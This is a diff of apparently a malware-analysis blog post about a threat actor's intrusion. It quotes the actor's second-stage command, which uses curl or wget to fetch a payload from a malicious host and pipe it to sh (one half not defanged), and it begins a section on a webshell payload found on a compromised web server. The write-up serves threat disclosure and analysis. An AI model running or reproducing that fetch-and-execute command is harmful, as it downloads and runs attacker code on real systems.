@@ -584,5 +584,16 @@ We can see this second stage will enumerate the operating systems architecture a
 ```
 (curl -fsSL -m180 hxxp://microsoft-symantec[.]art:8848/slt||wget -T180 -q http://microsoft-symantec.art:8848/slt)|sh
 ```
-
 * We can see this uses `curl` or `wget` to downloaded the payload `hxxp://microsoft-symantec[.]art:8848/slt` and execute it with `sh`.
+
+# Webshells / Backdoors
+
+## test.resources
+
+### Stage 1
+
+We managed to recover evidence that the threat actor delivered a payload, `test.resources`, to a compromised web-server. 
+
+[![2](/assets/images/china/test.resources_stage2.png)](/assets/images/china/test.resources_stage2.png){: .full}
+
+### Stage 2
